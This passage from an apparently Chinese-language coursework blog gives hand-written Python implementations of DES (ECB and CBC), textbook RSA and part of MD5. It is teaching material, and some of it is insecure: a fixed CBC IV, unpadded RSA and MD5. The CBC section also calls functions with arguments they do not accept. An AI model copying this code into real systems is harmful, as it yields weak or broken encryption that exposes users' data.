              [<span class="hljs-number">13</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">11</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>]
              ]
    res = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>), <span class="hljs-number">6</span>):
        begin_s = <span class="hljs-built_in">str</span>[i:i + <span class="hljs-number">6</span>]
        row = <span class="hljs-built_in">int</span>(begin_s[<span class="hljs-number">0</span>] + begin_s[<span class="hljs-number">5</span>], <span class="hljs-number">2</span>)  <span class="hljs-comment">#第一位和第六位作为行</span>
        col = <span class="hljs-built_in">int</span>(begin_s[<span class="hljs-number">1</span>:<span class="hljs-number">5</span>], <span class="hljs-number">2</span>)             <span class="hljs-comment">#中间四位作为列</span>
        index = s_list[j][row * <span class="hljs-number">16</span> + col]
        num = <span class="hljs-built_in">bin</span>(index)[<span class="hljs-number">2</span>:]                   <span class="hljs-comment">#将匹配的数字转换位二进制数</span>
        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4</span> - <span class="hljs-built_in">len</span>(num)):       <span class="hljs-comment">#不够4位则补0</span>
            num = <span class="hljs-string">&quot;0&quot;</span> + num
        res += num
        j = j + <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># p盒处理   置换操作</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">P_box</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):
    res = <span class="hljs-string">&quot;&quot;</span>
    change_table = [<span class="hljs-number">16</span>,<span class="hljs-number">7</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">29</span>,<span class="hljs-number">12</span>,<span class="hljs-number">28</span>,<span class="hljs-number">17</span>,
                    <span class="hljs-number">1</span>,<span class="hljs-number">15</span>,<span class="hljs-number">23</span>,<span class="hljs-number">26</span>,<span class="hljs-number">5</span>,<span class="hljs-number">18</span>,<span class="hljs-number">31</span>,<span class="hljs-number">10</span>,
                    <span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">24</span>,<span class="hljs-number">14</span>,<span class="hljs-number">32</span>,<span class="hljs-number">27</span>,<span class="hljs-number">3</span>,<span class="hljs-number">9</span>,
                    <span class="hljs-number">19</span>,<span class="hljs-number">13</span>,<span class="hljs-number">30</span>,<span class="hljs-number">6</span>,<span class="hljs-number">22</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">25</span>]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += <span class="hljs-built_in">str</span>[i - <span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># F函数</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">F_function</span>(<span class="hljs-params"><span class="hljs-built_in">str</span>, key</span>):  <span class="hljs-comment"># R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或-&gt;S盒-&gt;P置换</span>
    str_e_res = E_box(<span class="hljs-built_in">str</span>)            <span class="hljs-comment"># 将 E 异或 S  P 集合到一个函数种，便于调用</span>
    xor_res = xor(str_e_res, key)
    str_s_res = S_box(xor_res)
    str_p_res = P_box(str_s_res)
    <span class="hljs-keyword">return</span> str_p_res

<span class="hljs-comment"># 逆IP盒</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">IP_re</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):
    res = <span class="hljs-string">&quot;&quot;</span>
    ip_list = [<span class="hljs-number">40</span>,<span class="hljs-number">8</span>,<span class="hljs-number">48</span>,<span class="hljs-number">16</span>,<span class="hljs-number">56</span>,<span class="hljs-number">24</span>,<span class="hljs-number">64</span>,<span class="hljs-number">32</span>,
               <span class="hljs-number">39</span>,<span class="hljs-number">7</span>,<span class="hljs-number">47</span>,<span class="hljs-number">15</span>,<span class="hljs-number">55</span>,<span class="hljs-number">23</span>,<span class="hljs-number">63</span>,<span class="hljs-number">31</span>,
               <span class="hljs-number">38</span>,<span class="hljs-number">6</span>,<span class="hljs-number">46</span>,<span class="hljs-number">14</span>,<span class="hljs-number">54</span>,<span class="hljs-number">22</span>,<span class="hljs-number">62</span>,<span class="hljs-number">30</span>,
               <span class="hljs-number">37</span>,<span class="hljs-number">5</span>,<span class="hljs-number">45</span>,<span class="hljs-number">13</span>,<span class="hljs-number">53</span>,<span class="hljs-number">21</span>,<span class="hljs-number">61</span>,<span class="hljs-number">29</span>,
               <span class="hljs-number">36</span>,<span class="hljs-number">4</span>,<span class="hljs-number">44</span>,<span class="hljs-number">12</span>,<span class="hljs-number">52</span>,<span class="hljs-number">20</span>,<span class="hljs-number">60</span>,<span class="hljs-number">28</span>,
               <span class="hljs-number">35</span>,<span class="hljs-number">3</span>,<span class="hljs-number">43</span>,<span class="hljs-number">11</span>,<span class="hljs-number">51</span>,<span class="hljs-number">19</span>,<span class="hljs-number">59</span>,<span class="hljs-number">27</span>,
               <span class="hljs-number">34</span>,<span class="hljs-number">2</span>,<span class="hljs-number">42</span>,<span class="hljs-number">10</span>,<span class="hljs-number">50</span>,<span class="hljs-number">18</span>,<span class="hljs-number">58</span>,<span class="hljs-number">26</span>,
               <span class="hljs-number">33</span>,<span class="hljs-number">1</span>,<span class="hljs-number">41</span>,<span class="hljs-number">9</span>,<span class="hljs-number">49</span>,<span class="hljs-number">17</span>,<span class="hljs-number">57</span>,<span class="hljs-number">25</span> ]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ip_list:
        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res


<span class="hljs-comment"># DES加密操作</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">DESencode</span>(<span class="hljs-params">text, key</span>):
    text_bin = str_process(text)     <span class="hljs-comment"># 将字符转换为二进制数</span>
    text_IP = begin_change(text_bin)  <span class="hljs-comment"># 明文初始置换</span>
    key_bin = str_process(key)      <span class="hljs-comment"># 将密钥转换位二进制数</span>
    key_list = key_gen(key_bin) <span class="hljs-comment"># key_lsst 数组中存放着十六个子密钥</span>

    text_left = text_IP[<span class="hljs-number">0</span>:<span class="hljs-number">32</span>]     <span class="hljs-comment"># R0</span>
    text_right = text_IP[<span class="hljs-number">32</span>:]     <span class="hljs-comment"># L0</span>

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>):      <span class="hljs-comment"># 十五轮加密</span>

        mes_tmp = text_right     <span class="hljs-comment"># 临时变量用于左右两部分交换</span>
        text_right = xor(F_function(text_right, key_list[i]) , text_left) <span class="hljs-comment">#F 函数的作用 R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或(32位)-&gt;S盒(32位)-&gt;P置换(32位)</span>
        text_left = mes_tmp
    fin_right = text_right       <span class="hljs-comment"># 第十六轮加密</span>
    fin_left = xor(F_function(text_right, key_list[<span class="hljs-number">15</span>]), text_left)
    criph_text = fin_left + fin_right
    criph_text = IP_re(criph_text)     <span class="hljs-comment">#  IP逆置换</span>
    <span class="hljs-keyword">return</span> criph_text

<span class="hljs-comment"># 针对一组的解密程序</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">DESdecode</span>(<span class="hljs-params">text, key</span>):  <span class="hljs-comment">#密文直接输64位2进制</span>
    key_bin = str_process(key)    <span class="hljs-comment"># 将密钥转换为二进制数</span>
    key_list = key_gen(key_bin)   <span class="hljs-comment"># 生成的十六个子密钥</span>
    text = begin_change(text)   <span class="hljs-comment"># 先初始值换 与加密过程相反</span>
    cipher_left = text[<span class="hljs-number">0</span>:<span class="hljs-number">32</span>]    <span class="hljs-comment"># R16</span>
    cipher_right = text[<span class="hljs-number">32</span>:]    <span class="hljs-comment"># L16</span>
    i = <span class="hljs-number">15</span>
    <span class="hljs-keyword">while</span> i &gt; <span class="hljs-number">0</span>:                <span class="hljs-comment"># 十五轮加密 反过来</span>
        cipher_tmp = cipher_right   <span class="hljs-comment">#设置一个临时变量用于后面的交换</span>
        cipher_right = xor(cipher_left, F_function(cipher_right, key_list[i]))    <span class="hljs-comment"># F 函数的作用 R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或(32位)-&gt;S盒(32位)-&gt;P置换(32位)</span>
                                                                                  <span class="hljs-comment"># F 函数处理完后与L(32位)异或</span>
        cipher_left = cipher_tmp    <span class="hljs-comment"># 左右交换完成</span>
        i = i - <span class="hljs-number">1</span>
    left_text = xor(cipher_left, F_function(cipher_right, key_list[<span class="hljs-number">0</span>])) <span class="hljs-comment"># 一</span>
    right_text = cipher_right                                           <span class="hljs-comment"># 二 三 这三步是第十六轮加密</span>
    plain_bin = left_text + right_text                                  <span class="hljs-comment">#</span>
    plain_bin = IP_re(plain_bin)                                        <span class="hljs-comment">#</span>
    plain_text = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(plain_bin), <span class="hljs-number">8</span>):
        plain_text += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(plain_bin[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>))
    <span class="hljs-keyword">return</span> plain_text


<span class="hljs-keyword">def</span> <span class="hljs-title function_">Divide_text</span>(<span class="hljs-params">order,text,key</span>):    <span class="hljs-comment"># 将明文或者明文分组 明文分成8个字符一组，密文则分成64bit一组</span>
    block_text = []
    res = <span class="hljs-string">&quot;&quot;</span>
    length = <span class="hljs-number">0</span>
    <span class="hljs-keyword">if</span> order == <span class="hljs-string">&quot;E&quot;</span>:
        length = <span class="hljs-number">8</span>
    <span class="hljs-keyword">else</span>:
        length = <span class="hljs-number">64</span>
    i = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> text[i:i+length] != <span class="hljs-string">&quot;&quot;</span>:
        block_text.append(text[i:i+length])
        i += length

    <span class="hljs-keyword">if</span> order == <span class="hljs-string">&#x27;E&#x27;</span>:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(block_text[-<span class="hljs-number">1</span>]) != <span class="hljs-number">8</span>:       <span class="hljs-comment"># 最后一组明文如果不够八个字符则添加 + 补齐八个  否则程序会报错</span>
            block_text[-<span class="hljs-number">1</span>] = block_text[-<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;+&#x27;</span> * (<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(block_text[-<span class="hljs-number">1</span>]))
        <span class="hljs-keyword">for</span> text <span class="hljs-keyword">in</span> block_text:             <span class="hljs-comment"># 分别对每组加密</span>
            res += DESencode(text, key)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">for</span> text <span class="hljs-keyword">in</span> block_text:             <span class="hljs-comment"># 对密文解密</span>
            res += DESdecode(text, key)
    <span class="hljs-keyword">return</span> res

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
        plaintext = <span class="hljs-string">&#x27;&#x27;</span>
        ciphertext = <span class="hljs-string">&#x27;&#x27;</span>
        key = <span class="hljs-string">&#x27;&#x27;</span>
        order = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;加密请按E,解密请按D:&quot;</span>)
        <span class="hljs-keyword">if</span> order == <span class="hljs-string">&#x27;E&#x27;</span>:
            plaintext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入明文：&quot;</span>)
            key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密钥：&quot;</span>)
            ciphertext = Divide_text(order, plaintext, key)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;密文是：&quot;</span>)
            <span class="hljs-built_in">print</span>(ciphertext)
        <span class="hljs-keyword">else</span>:
            ciphertext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密文：&quot;</span>)
            key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密钥：&quot;</span>)
            plaintext = Divide_text(order, ciphertext, key)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;明文是：&quot;</span>)
            <span class="hljs-built_in">print</span>(plaintext)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    main()</code></pre>



<p>DES_CBC模式</p>
<p>只需要修改ECB模式中的 Divide_text 部分</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Divide_text</span>(<span class="hljs-params">order,text,key</span>):    <span class="hljs-comment"># 将明文或者明文分组 明文分成8个字符一组，密文则分成64bit一组</span>
    block_text = []
    IV = <span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>                 <span class="hljs-comment"># 初始化向量</span>
    IV_bin = str_process(IV)
    res = <span class="hljs-string">&quot;&quot;</span>
    length = <span class="hljs-number">0</span>
    <span class="hljs-keyword">if</span> order == <span class="hljs-string">&quot;E&quot;</span>:
        length = <span class="hljs-number">8</span>
    <span class="hljs-keyword">else</span>:
        length = <span class="hljs-number">64</span>
    i = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> text[i:i+length] != <span class="hljs-string">&quot;&quot;</span>:
        block_text.append(text[i:i+length])
        i += length
    tmp = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-comment"># 加密</span>
    <span class="hljs-keyword">if</span> order == <span class="hljs-string">&#x27;E&#x27;</span>:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(block_text[-<span class="hljs-number">1</span>]) != <span class="hljs-number">8</span>:       <span class="hljs-comment"># 最后一组明文如果不够八个字符则添加 + 补齐八个  否则程序会报错</span>
            block_text[-<span class="hljs-number">1</span>] = block_text[-<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;+&#x27;</span> * (<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(block_text[-<span class="hljs-number">1</span>]))

        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(block_text)):             <span class="hljs-comment"># 分别对每组加密</span>
            <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span> :
                tmp = DESencode(block_text[i],key, IV_bin)
                res += tmp
            <span class="hljs-keyword">else</span>:
                tmp = DESencode(block_text[i],key,tmp)
                res += tmp
    <span class="hljs-comment"># 解密</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(block_text)):
            <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:
                tmp = block_text[i]
                res += DESdecode(block_text[i], key, IV_bin)
            <span class="hljs-keyword">else</span>:
                res += DESdecode(block_text[i], key, tmp)
                tmp = block_text[i]
    <span class="hljs-keyword">return</span> res</code></pre>



<h1 id="四、RSA"><a href="#四、RSA" class="headerlink" title="四、RSA"></a>四、RSA</h1><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/12/23 14:24</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : rsa.py</span>

<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> random

<span class="hljs-comment"># 模重复平方法</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">fast_mod</span>(<span class="hljs-params">p,q,n</span>):     <span class="hljs-comment"># p为底数，p为指数</span>
    res = <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span> q:
        <span class="hljs-keyword">if</span> q &amp; <span class="hljs-number">1</span>:
            res = (res * p) % n
        q &gt;&gt;= <span class="hljs-number">1</span>             <span class="hljs-comment"># 右移1位</span>
        p = (p * p) % n
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 计算出d</span>
<span class="hljs-comment">#这个扩展欧几里得算法求模逆,用于求d</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">caculateD</span>(<span class="hljs-params">a, m</span>):
    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a
    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m
    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:
        q = u3//v3
        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3
    <span class="hljs-keyword">return</span> u1%m


<span class="hljs-comment"># 将字符转化为十六进制字符串</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">str2Hex</span>(<span class="hljs-params">m</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">&quot;&#123;:02x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(x)) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> m)

<span class="hljs-comment"># 素性检验：采用 Miler-Rabin 检验法</span>
<span class="hljs-comment"># 所有的𝑟 ∈ [0, 𝑠 − 1]，若𝑎^𝑑 ≠ 1(𝑚𝑜𝑑 𝑛)且𝑎^((2^𝑟)*𝑑) ≠ −1(𝑚𝑜𝑑 𝑛)，则𝑛是合数。否则，𝑛有 3/4的概率为素数</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">miller_rabin</span>(<span class="hljs-params">n</span>):
    s = n - <span class="hljs-number">1</span>
    t = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> s % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:  <span class="hljs-comment"># n,s,t之间的关系为 n = 2^s * t</span>
        s = s // <span class="hljs-number">2</span>
        t += <span class="hljs-number">1</span>
    <span class="hljs-keyword">for</span> trials <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):   <span class="hljs-comment"># 可以多增加几轮保证大概率为素数</span>
        a = random.randrange(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>) <span class="hljs-comment"># 随机生成a</span>
        v = <span class="hljs-built_in">pow</span>(a, s, n)               <span class="hljs-comment"># 验证 a^(n-1) mod n</span>
        <span class="hljs-keyword">if</span> v != <span class="hljs-number">1</span>:
            i = <span class="hljs-number">0</span>
            <span class="hljs-keyword">while</span> v != (n - <span class="hljs-number">1</span>):
                <span class="hljs-keyword">if</span> i == t - <span class="hljs-number">1</span>:
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-keyword">else</span>:
                    i = i + <span class="hljs-number">1</span>
                    v = (v ** <span class="hljs-number">2</span>) % n
    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
<span class="hljs-comment"># 生成素数 先生成1024位的奇数，再进行素性检验，通过则生成该素数</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">genPrime</span>(<span class="hljs-params">b=<span class="hljs-number">1024</span></span>):
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:                             <span class="hljs-comment"># 设置死循环直到生成素数才退出</span>
        res = <span class="hljs-string">&quot;1&quot;</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b-<span class="hljs-number">2</span>):
            res += <span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))
        res += <span class="hljs-string">&quot;1&quot;</span>                              <span class="hljs-comment"># 最后一位为1保证为奇数</span>
        res = <span class="hljs-built_in">int</span>(res,<span class="hljs-number">2</span>)
        <span class="hljs-keyword">if</span> miller_rabin(res):
            <span class="hljs-keyword">return</span> res                          <span class="hljs-comment"># 直到该数通过素数检验才推出循环</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">genE</span>(<span class="hljs-params">phi_n</span>):
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        e = genPrime(b=random.randint(<span class="hljs-number">3</span>,<span class="hljs-number">13</span>))  <span class="hljs-comment">#随机生成e</span>
        <span class="hljs-keyword">if</span> e &lt; <span class="hljs-number">2000</span> :                  <span class="hljs-comment"># e不能太小</span>
            <span class="hljs-keyword">continue</span>
        <span class="hljs-keyword">if</span> phi_n%e != <span class="hljs-number">0</span>:               <span class="hljs-comment"># 保证e不能被phi整除</span>
            <span class="hljs-keyword">return</span> e

<span class="hljs-keyword">def</span> <span class="hljs-title function_">RSAEncode</span>(<span class="hljs-params">m, e, n</span>):               <span class="hljs-comment"># 加密公式 m^e mod n</span>
    m = <span class="hljs-built_in">int</span>(str2Hex(m), <span class="hljs-number">16</span>)           <span class="hljs-comment"># 将字符转换为二进制</span>
    c = fast_mod(m, e, n)
    <span class="hljs-keyword">return</span> c

<span class="hljs-keyword">def</span> <span class="hljs-title function_">RSADecode</span>(<span class="hljs-params">c, d, n</span>):                 <span class="hljs-comment"># 加密公式 c^d mod n</span>
    plaintext = fast_mod(c,d,n)
    plaintext = <span class="hljs-built_in">str</span>(long_to_bytes(plaintext).decode()) <span class="hljs-comment"># 将数字转换为字符</span>
    <span class="hljs-keyword">return</span> plaintext


<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-comment"># 生成两个大素数p和q</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Generate p,q and e, please wait... &quot;</span>)
    p = genPrime()
    q = genPrime()
    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;p = &quot;</span>+<span class="hljs-built_in">str</span>(p))
    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;q = &quot;</span>+<span class="hljs-built_in">str</span>(q))
    n = p*q
    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;n = &quot;</span>+<span class="hljs-built_in">str</span>(n))
    <span class="hljs-comment"># 用欧拉定理计算 phi_n</span>
    phi_n = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)
    <span class="hljs-comment"># 生成e</span>
    e = genE(phi_n)
    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;e = &quot;</span>+<span class="hljs-built_in">str</span>(e))
    <span class="hljs-comment"># m = &quot;Hello world!&quot;</span>
    m = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入明文: &#x27;</span>))
    <span class="hljs-comment"># 加密算法</span>
    Cryphtext = RSAEncode(m, e, n)
    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;The Ciphertext is: &quot;</span>+<span class="hljs-built_in">str</span>(Cryphtext))
    <span class="hljs-comment"># 解密算法</span>
    d = caculateD(e, phi_n)
    Plaintext = RSADecode(Cryphtext, d, n)
    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;The Plaintext is: &quot;</span>+Plaintext)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    main()</code></pre>





<h1 id="五、MD5"><a href="#五、MD5" class="headerlink" title="五、MD5"></a>五、MD5</h1><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/12/18 21:50</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : MD5.py</span>

<span class="hljs-keyword">import</span> math
<span class="hljs-comment"># 定义初始向量abcd,并将其转换成2进制,且补0到32位</span>
<span class="hljs-comment"># 标准的幻数（物理顺序）是（A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。如果在程序中定义应该是:</span>
<span class="hljs-comment"># （A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L）</span>
ABCD_list = [<span class="hljs-string">&#x27;67452301&#x27;</span>,<span class="hljs-string">&#x27;efcdab89&#x27;</span>,<span class="hljs-string">&#x27;98badcfe&#x27;</span>,<span class="hljs-string">&#x27;10325476&#x27;</span>]
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ABCD_list)):
    tmp = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(ABCD_list[i], <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:]
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) &lt; <span class="hljs-number">32</span>:
        tmp = (<span class="hljs-number">32</span> - <span class="hljs-built_in">len</span>(tmp)) * <span class="hljs-string">&#x27;0&#x27;</span> + tmp
    ABCD_list[i] = tmp
A0,B0,C0,D0 = ABCD_list[<span class="hljs-number">0</span>], ABCD_list[<span class="hljs-number">1</span>], ABCD_list[<span class="hljs-number">2</span>], ABCD_list[<span class="hljs-number">3</span>]

<span class="hljs-comment"># 生成第1-64个式子的第i个32比特常数</span>
Ti = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">64</span>):
    result = (<span class="hljs-built_in">int</span>(<span class="hljs-number">4294967296</span> * <span class="hljs-built_in">abs</span>(math.sin(i + <span class="hljs-number">1</span>)))) &amp; <span class="hljs-number">0xffffffff</span>
    result = <span class="hljs-built_in">bin</span>(result)[<span class="hljs-number">2</span>:]
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(result) &lt; <span class="hljs-number">32</span>:
        result = (<span class="hljs-number">32</span> - <span class="hljs-built_in">len</span>(result)) * <span class="hljs-string">&#x27;0&#x27;</span> + result
    Ti.append(result)

<span class="hljs-comment"># 实现x,y的逐比特与</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">and1</span>(<span class="hljs-params">x, y</span>):
    res = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x)):
        res += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(x[i])&amp;<span class="hljs-built_in">int</span>(y[i]))
    <span class="hljs-keyword">return</span> res
<span class="hljs-comment"># 实现x,y的逐比特或</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">or1</span>(<span class="hljs-params">x, y</span>):
    res = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x)):
        res += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(x[i])|<span class="hljs-built_in">int</span>(y[i]))
    <span class="hljs-keyword">return</span> res
<span class="hljs-comment"># 实现x,y的逐比特异或</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">x, y</span>):
    res = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x)):
        res += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(x[i])^<span class="hljs-built_in">int</span>(y[i]))
    <span class="hljs-keyword">return</span> res
<span class="hljs-comment"># 实现x的逐比特逻辑反</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse</span>(<span class="hljs-params">x</span>):
    res = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x)):
